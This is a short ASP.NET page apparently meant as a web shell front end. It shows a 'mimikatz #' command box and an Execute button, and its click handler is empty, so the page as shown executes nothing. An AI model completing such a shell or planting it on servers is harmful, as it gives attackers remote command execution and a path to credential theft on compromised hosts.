<%@ Page Language="C#" Debug="true" Trace="false" %>

<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>


<html>
    <head>

            <style>
                    body{
                        background: #000000;
                        color:#FFFFFF;
                    }
                    </style>
                    
    </head>
    <script language="c#" runat="server">
protected void execute_Click(object sender,System.EventArgs e){

}
        </script>
<body>
<form id="mimi" runat="server">
        mimikatz #    <asp:TextBox ID="command" runat="server"></asp:TextBox>
        <asp:Button ID="cmdExecute" runat="server" Text="Execute" OnClick="execute_Click" />
    
</form>
    
</body>
</html>